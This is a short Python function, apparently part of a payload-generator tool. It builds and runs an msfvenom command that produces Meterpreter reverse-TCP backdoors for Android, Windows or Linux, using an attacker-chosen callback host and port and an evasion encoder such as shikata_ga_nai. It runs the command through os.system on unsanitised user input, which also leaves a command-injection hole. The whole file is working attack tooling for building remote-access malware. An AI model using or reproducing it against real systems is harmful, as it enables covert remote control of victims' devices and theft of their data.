def generate_payload(platform, lhost, lport, outfile):
    import os

    arch = input("Architecture (x86/x64): ").strip()
    encoder = input("Encoder (e.g., x86/shikata_ga_nai): ").strip()

    payloads = {
        "android": "android/meterpreter/reverse_tcp",
        "windows": "windows/meterpreter/reverse_tcp",
        "linux": "linux/x86/meterpreter/reverse_tcp"
    }

    formats = {
        "android": "apk",
        "windows": "exe",
        "linux": "elf"
    }

    payload = payloads.get(platform, "windows/meterpreter/reverse_tcp")
    outformat = formats.get(platform, "exe")
    filename = f"{outfile}.{outformat}"

    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e {encoder} -a {arch} --platform {platform} -f {outformat} -o {filename}"
    print(f"[+] Running: {command}")
    os.system(command)
    return payload, outformat
